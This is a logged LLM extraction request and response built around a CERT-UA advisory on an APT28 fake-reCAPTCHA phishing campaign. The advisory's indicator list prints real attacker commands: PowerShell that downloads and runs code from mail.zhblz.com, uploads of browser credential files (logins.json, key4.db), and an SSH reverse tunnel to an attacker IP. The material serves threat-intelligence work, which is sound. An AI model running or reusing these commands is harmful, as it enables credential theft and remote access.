@@ -1,0 +1,340 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens, in your own words, as specific as the text allows (e.g. `distributes-via-email`, `communicates-with-c2`, `exploits-vulnerability-in`). There is no fixed list; choose the phrase that best names the relationship.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY relation type you used in this report.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA досліджується активність, пов'язана із розповсюдженням серед органів місцевого самоврядування електронних листів з темою "Заміну таблиці" та посиланням, що імітує Google таблицю.</p><p>У випадку переходу за посиланням користувачеві буде відображене вікно, що імітує механізм захисту від ботів reCAPTCHA. Якщо клікнути у полі, навпроти надпису "I'm not a robot", до буферу обміну комп'ютера буде скопійовано PowerShell-команду, а у вікні, що з'явиться, буде відображено "інструкцію", в якій пропонується натиснути комбінацію клавіш "Win+R" (для відкриття командного рядка), після чого виконати другу комбінацію клавіш "Ctrl+V" (вставити в командний рядок команду) та натиснути "Enter", що призведе до виконання PowerShell-команди.</p><p>Згадана команда забезпечить завантаження і запуск HTA-файлу "browser.hta" (очистить вміст буферу обміну) та PowerShell-сценарію "Browser.ps1", основним призначенням якого є:</p><ul><li>завантаження і запуск SSH для побудови тунелю</li><li>викрадення та ексфільтрацію автентифікаційних та інших даних браузерів Chrome, Edge, Opera, Firefox</li><li>завантаження та запуск програмного засобу METASPLOIT.</li></ul><p>Зауважимо, що у вересні 2024 року CERT-UA досліджено інцидент (CERT-UA#10859), пов'язаний із розповсюдженням електронних листів, що містили експлойт для вразливості в Roundcube (CVE-2023-43770), успішне спрацювання якого створювало технічні можливості для викрадення автентифікаційних даних користувача, а також призводило до створення фільтру "SystemHealth<strong>Chek</strong>" (плагін "ManageSiev"), який забезпечував перенаправлення вмісту поштової скриньки жертви на електронну адресу зловмисника.</p><p>В обох випадках у якості управляючої інфраструктури використовувався (скомпрометований) сервер "mail.zhblz[.]com" (203.161.50[.]145).</p><p>Слід також додати, що під час дослідження згаданого інциденту виявлено більше 10 скомпрометованих облікових записів електронної пошти державної організації, вміст яких регулярно автоматизовано отримувався зловмисниками, та які, серед іншого, використовувалися для розсилки електронних листів з експлойтами, в тому числі, оборонним відомствам інших країни світу.</p><p>З середнім рівнем впевненості описана активність асоційована з діяльністю угрупування UAC-0001 (APT28).</p><p><br></p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">e9cb6270f09e3324e6620b8c909a83c6&nbsp;&nbsp;&nbsp;&nbsp;d34ee70f162ce1dab6a80a6a3c8dabd8d2b1a77345be5b1d956c765752b11802&nbsp;&nbsp;&nbsp;&nbsp;Browser.ps1  
+d73124dbb5d8e5702df065a122878740&nbsp;&nbsp;&nbsp;&nbsp;4e1bc758f08593a873e5e1d6f7d4eac05f690841abc90ddfa713c2bec4f9970f    Browser.ps1  
+597bd15ff25636d9cde61157c2a3c8a2&nbsp;&nbsp;&nbsp;&nbsp;5200a4e1bb5174a3203ce603c34625493a5a88f0dfb98ed5856b18655fb7ba60    browser.hta  
+446bab23379df08fecbab6fe9b00344e&nbsp;&nbsp;&nbsp;&nbsp;3ec9a66609f1bea8f30845e5dbcf927cf0b3e92e40ef40272fdf6d784ba0d0af    zapit.exe     [METASPLOIT]
+f389247be7524e2d4afc98f6811622fe&nbsp;&nbsp;&nbsp;&nbsp;e3a3abf8c80637445bab387be288b6475992b6b556cb55a5a8c366401fb864c5    rdp.exe  
+981943d2e7ec0ab3834c639f49cc4b42&nbsp;&nbsp;&nbsp;&nbsp;6bbf2b86e023f132416f40690b0386bd00e00cf3e1bef725dec92df7f1cd1007    id_rsa  
+d26920b81f4e6b014a0d63169e68dfa7&nbsp;&nbsp;&nbsp;&nbsp;edb81219b7728fa2ea1d97d5b3189f498ed09a72b800e115f12843f852b2a441    ssh.exe       (legit)  
+d1ccc802272a380b32338d17b2ac40a1&nbsp;&nbsp;&nbsp;&nbsp;2446ab2e4dc85dc8b27141b2c1f777a01706f16d6608f4b5b0990f8b80dea9e0    libcrypto.dll (legit)
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">hXXps://docs.google.com.spreadsheets.d.1ip6eeakdebmwteh36vana4hu-glaeksstsht-boujdk.zhblz[.]com/document
+(tcp)://mail.zhblz[.]com:8443
+hXXps://mail.zhblz[.]com
+hXXps://mail.zhblz[.]com/B
+hXXps://mail.zhblz[.]com/b
+hXXps://mail.zhblz[.]com/endpoint
+hXXps://mail.zhblz[.]com/upload
+hXXps://mail.zhblz[.]com/z
+hXXps://mail.zhblz[.]com/id_rsa
+hXXps://mail.zhblz[.]com/libcrypto
+hXXps://mail.zhblz[.]com/ssh
+
+(tcp)://203[.]161.50.145:22
+(tcp)://203[.]161.50.145:6211
+(tcp)://45[.]61.169.221:445
+
+doc.gmail.com.gyehddhrggdii323sdhnshiswh2udhqjwdhhfjcjeuejcj.zhblz[.]com
+docs.google.com.spreadsheets.d.1ip6eeakdebmwteh36vana4hu-glaeksstsht-boujdk.zhblz[.]com
+mail.zhblz[.]com
+
+203[.]161.50.145&nbsp;&nbsp;&nbsp;&nbsp;
+45[.]61.169.221&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+
+Індикатори з інциденту CERT-UA#10859 (несанкціонований доступ до поштових скриньок)
+103[.]50.33.50
+103[.]50.33.54
+109[.]236.63.165
+185[.]197.248.94
+194[.]35.121.200
+194[.]35.121.202
+194[.]35.121.50
+195[.]64.155.64
+198[.]54.117.242
+203[.]161.50.145
+37[.]19.218.144
+37[.]19.218.146
+37[.]19.218.156
+37[.]19.218.157
+37[.]19.218.160
+37[.]19.218.168
+37[.]19.218.174
+37[.]19.218.183
+45[.]155.43.118
+45[.]155.43.121
+45[.]94.211.159
+45[.]94.211.161
+45[.]94.211.164
+80[.]77.25.206
+95[.]214.216.76
+95[.]214.216.78
+95[.]214.217.94
+
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
+exchangelib/5.4.2 (python-requests/2.32.3)
+</pre><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">%APPDATA%\id_rsa
+%APPDATA%\zapit.exe
+%APPDATA%\ssh.exe
+%APPDATA%\libcrypto.dll
+
+C:\Users\Malgus\source\repos\rdp\rdp\obj\Debug\rdp.pdb
+
+mshta&nbsp;hXXps://mail.zhblz[.]com/b
+ssh&nbsp;recaptcha@203.161.50.145&nbsp;-N&nbsp;-i&nbsp;%APPDATA%\id_rsa&nbsp;-R&nbsp;0&nbsp;-o StrictHostKeyChecking=no&nbsp;-o&nbsp;"PermitLocalCommand=yes"&nbsp;-o&nbsp;"LocalCommand=ssh&nbsp;-i \\45.61.169.221\key.pem&nbsp;user@1.1.1.1" 
+%APPDATA%\ssh.exe&nbsp;recaptcha@203.161.50.145&nbsp;-N&nbsp;-i&nbsp;%APPDATA%\id_rsa&nbsp;-R&nbsp;0&nbsp;-o StrictHostKeyChecking=no
+
+powershell -WindowStyle Hidden -nop -exec bypass -c "iex (New-Object Net.WebClient).DownloadString('https://mail.zhblz.com/B');pumpndump -hq https://mail.zhblz.com;mshta https://mail.zhblz.com/b #&nbsp;&nbsp;&nbsp; ✅ ''I am not a robot - reCAPTCHA ID: {verification_id}''"
+powershell&nbsp;-WindowStyle&nbsp;Hidden&nbsp;-nop&nbsp;-exec&nbsp;bypass&nbsp;-c&nbsp;"Invoke-RestMethod&nbsp;-Uri https://mail.zhblz.com/upload&nbsp;-Method&nbsp;Post&nbsp;-Body (@{filename='logins.json';file='&lt;Base64EncodedData&gt;'}|ConvertTo-Json)&nbsp;-ContentType&nbsp;'application/json'"
+powershell&nbsp;-WindowStyle&nbsp;Hidden&nbsp;-nop&nbsp;-exec&nbsp;bypass&nbsp;-c&nbsp;"Invoke-RestMethod&nbsp;-Uri https://mail.zhblz.com/upload&nbsp;-Method&nbsp;Post&nbsp;-Body (@{filename='key4.db';file='&lt;Base64EncodedData&gt;'}|ConvertTo-Json)&nbsp;-ContentType&nbsp;'application/json'"
+powershell&nbsp;-WindowStyle&nbsp;Hidden&nbsp;-nop&nbsp;-exec&nbsp;bypass&nbsp;-c&nbsp;"Invoke-WebRequest&nbsp;-Uri https://mail.zhblz.com/libcrypto&nbsp;-OutFile&nbsp;%APPDATA%\libcrypto.dll"
+powershell&nbsp;-WindowStyle&nbsp;Hidden&nbsp;-nop&nbsp;-exec&nbsp;bypass&nbsp;-c&nbsp;"Invoke-WebRequest&nbsp;-Uri https://mail.zhblz.com/ssh&nbsp;-OutFile&nbsp;%APPDATA%\ssh.exe"
+powershell&nbsp;-WindowStyle&nbsp;Hidden&nbsp;-nop&nbsp;-exec&nbsp;bypass&nbsp;-c&nbsp;"Invoke-WebRequest&nbsp;-Uri https://mail.zhblz.com/z&nbsp;-OutFile&nbsp;%APPDATA%\zapit.exe"
+powershell&nbsp;-WindowStyle&nbsp;Hidden&nbsp;-nop&nbsp;-exec&nbsp;bypass&nbsp;-c&nbsp;"Invoke-WebRequest https://mail.zhblz.com/id_rsa&nbsp;-OutFile&nbsp;$env:APPDATA\id_rsa"
+powershell&nbsp;-WindowStyle&nbsp;Hidden&nbsp;-nop&nbsp;-exec&nbsp;bypass&nbsp;-c&nbsp;"%APPDATA%\zapit.exe"
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p>Рис.1 Приклад ланцюга ураження</p><p><br></p><p></p><p>Рис.2 Приклад ланцюга ураження у випадку з експлойтом для CVE-2023-43770 (CERT-UA#10859)</p>
+
+=== RESPONSE (7.5s, in 4609 / out 2316 tok, STOP) ===
+```json
+{
+  "entities": [
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe."
+    },
+    {
+      "name": "UAC-0001",
+      "kind": "threat actor",
+      "gloss": "A Russian state-sponsored cyber espionage group also known as APT28."
+    },
+    {
+      "name": "Browser.ps1",
+      "kind": "malware script",
+      "gloss": "A PowerShell script designed to establish SSH tunnels, exfiltrate browser data, and execute Metasploit."
+    },
+    {
+      "name": "browser.hta",
+      "kind": "malware file",
+      "gloss": "An HTML Application file executed during the attack to clear clipboard content and assist infection."
+    },
+    {
+      "name": "zapit.exe",
+      "kind": "malware payload",
+      "gloss": "An executable payload implementing Metasploit framework capabilities."
+    },
+    {
+      "name": "METASPLOIT",
+      "kind": "penetration testing software",
+      "gloss": "A penetration testing framework commonly abused by attackers for post-exploitation."
+    },
+    {
+      "name": "rdp.exe",
+      "kind": "executable file",
+      "gloss": "A suspicious executable observed in connection with the cyber incident."
+    },
+    {
+      "name": "Roundcube",
+      "kind": "software product",
+      "gloss": "A widely used open-source webmail software client."
+    },
+    {
+      "name": "CVE-2023-43770",
+      "kind": "vulnerability",
+      "gloss": "A cross-site scripting vulnerability in Roundcube webmail allowing information theft."
+    },
+    {
+      "name": "ManageSiev",
+      "kind": "software plugin",
+      "gloss": "A Roundcube plugin used to manage Sieve mail filtering rules."
+    },
+    {
+      "name": "SystemHealthChek",
+      "kind": "mail filter",
+      "gloss": "A malicious email forwarding filter created using the Roundcube ManageSiev plugin."
+    },
+    {
+      "name": "mail.zhblz[.]com",
+      "kind": "domain",
+      "gloss": "A compromised domain and server used as command and control infrastructure."
+    },
+    {
+      "name": "203.161.50[.]145",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the malicious command and control infrastructure."
+    },
+    {
+      "name": "45[.]61.169.221",
+      "kind": "ip address",
+      "gloss": "An IP address observed hosting network services and resources during the attack."
+    },
+    {
+      "name": "doc.gmail.com.gyehddhrggdii323sdhnshiswh2udhqjwdhhfjcjeuejcj.zhblz[.]com",
+      "kind": "domain",
+      "gloss": "A subdomain used in phishing or malicious delivery chains."
+    },
+    {
+      "name": "docs.google.com.spreadsheets.d.1ip6eeakdebmwteh36vana4hu-glaeksstsht-boujdk.zhblz[.]com",
+      "kind": "domain",
+      "gloss": "A spoofed Google Sheets subdomain used in phishing links."
+    },
+    {
+      "name": "Chrome",
+      "kind": "web browser",
+      "gloss": "A web browser developed by Google."
+    },
+    {
+      "name": "Edge",
+      "kind": "web browser",
+      "gloss": "A web browser developed by Microsoft."
+    },
+    {
+      "name": "Opera",
+      "kind": "web browser",
+      "gloss": "A web browser developed by Opera Software."
+    },
+    {
+      "name": "Firefox",
+      "kind": "web browser",
+      "gloss": "A web browser developed by the Mozilla Foundation."
+    },
+    {
+      "name": "CERT-UA#10859",
+      "kind": "incident identifier",
+      "gloss": "A CERT-UA tracking identifier for a cyber incident investigated in September 2024."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0001",
+      "type": "associated-with-activity",
+      "tail": "Browser.ps1",
+      "evidence": "З середнім рівнем впевненості описана активність асоційована з діяльністю угрупування UAC-0001"
+    },
+    {
+      "head": "Browser.ps1",
+      "type": "deploys-and-executes",
+      "tail": "METASPLOIT",
+      "evidence": "завантаження та запуск програмного засобу METASPLOIT"
+    },
+    {
+      "head": "Browser.ps1",
+      "type": "targets-browser-data",
+      "tail": "Chrome",
+      "evidence": "викрадення та ексфільтрацію автентифікаційних та інших даних браузерів Chrome"
+    },
+    {
+      "head": "Browser.ps1",
+      "type": "targets-browser-data",
+      "tail": "Edge",
+      "evidence": "викрадення та ексфільтрацію автентифікаційних та інших даних браузерів Chrome, Edge"
+    },
+    {
+      "head": "Browser.ps1",
+      "type": "targets-browser-data",
+      "tail": "Opera",
+      "evidence": "викрадення та ексфільтрацію автентифікаційних та інших даних браузерів Chrome, Edge, Opera"
+    },
+    {
+      "head": "Browser.ps1",
+      "type": "targets-browser-data",
+      "tail": "Firefox",
+      "evidence": "викрадення та ексфільтрацію автентифікаційних та інших даних браузерів Chrome, Edge, Opera, Firefox"
+    },
+    {
+      "head": "CERT-UA#10859",
+      "type": "involves-vulnerability",
+      "tail": "CVE-2023-43770",
+      "evidence": "досліджено інцидент (CERT-UA#10859), пов'язаний із розповсюдженням електронних листів, що містили експлойт для вразливості в Roundcube (CVE-2023-43770)"
+    },
+    {
+      "head": "CVE-2023-43770",
+      "type": "affects-software",
+      "tail": "Roundcube",
+      "evidence": "вразливості в Roundcube (CVE-2023-43770)"
+    },
+    {
+      "head": "CERT-UA#10859",
+      "type": "created-filter",
+      "tail": "SystemHealthChek",
+      "evidence": "призводило до створення фільтру \"SystemHealthChek\""
+    },
+    {
+      "head": "SystemHealthChek",
+      "type": "uses-plugin",
+      "tail": "ManageSiev",
+      "evidence": "фільтру \"SystemHealthChek\" (плагін \"ManageSiev\")"
+    },
+    {
+      "head": "mail.zhblz[.]com",
+      "type": "resolves-to-ip",
+      "tail": "203.161.50[.]145",
+      "evidence": "сервер \"mail.zhblz[.]com\" (203.161.50[.]145)"
+    },
+    {
+      "head": "UAC-0001",
+      "type": "uses-infrastructure",
+      "tail": "mail.zhblz[.]com",
+      "evidence": "у якості управляючої інфраструктури використовувався (скомпрометований) сервер \"mail.zhblz[.]com\""
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "associated-with-activity",
+      "definition": "The threat actor is linked or attributed to the specified malicious activity or tool."
+    },
+    {
+      "name": "deploys-and-executes",
+      "definition": "The source malware or script downloads, drops, or executes the target tool or payload."
+    },
+    {
+      "name": "targets-browser-data",
+      "definition": "The malware extracts stored credentials or session information from the specified web browser."
+    },
+    {
+      "name": "involves-vulnerability",
+      "definition": "The incident report or attack chain leveraged the specified security vulnerability."
+    },
+    {
+      "name": "affects-software",
+      "definition": "The vulnerability exists in or affects the specified software application."
+    },
+    {
+      "name": "created-filter",
+      "definition": "The exploit or incident resulted in the creation of the specified email filter rule."
+    },
+    {
+      "name": "uses-plugin",
+      "definition": "The rule or mechanism was implemented using the specified software plugin."
+    },
+    {
+      "name": "resolves-to-ip",
+      "definition": "The domain name resolves to or is hosted on the specified IP address."
+    },
+    {
+      "name": "uses-infrastructure",
+      "definition": "The threat actor or campaign utilized the specified domain or server infrastructure."
+    }
+  ]
+}
+```
